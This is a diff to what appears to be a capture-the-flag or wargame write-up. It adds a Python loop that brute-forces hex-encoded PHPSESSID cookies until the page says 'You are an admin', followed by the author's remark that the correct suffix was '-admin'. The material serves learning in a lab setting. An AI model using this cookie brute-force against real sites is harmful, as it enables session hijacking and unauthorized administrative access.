@@ -47,4 +47,19 @@ for session_id in range(1, 100, 10):
     print(session_str)
 ```
 
-Then, all I had to do was incorporate a brute-force of the session ID in get requests to the for loop... but it wasn't really that simple (ongoing)
+Then, all I had to do was incorporate a brute-force of the session ID in get requests to the for loop...
+
+```python
+for session_id in range(1, 641):
+    session_str = str(session_id) + "-a"
+    session_str = session_str.encode('utf-8').hex()
+    response = session.get(url, cookies={"PHPSESSID": str(session_str)}, auth=(username, password))
+    if 'You are an admin' in response.text:
+        print('Success!')
+        print(response.text)
+        break
+    else:
+        print("Tried " + session_str)
+```
+
+I then brute-forced all the possible cookies and yielded no results. After hours of troubleshooting, I viewed a video walkthrough and found I was supposed to append `-admin` instead of `-a` to the session ID. It seems I had all the parts right except for the most obvious one.
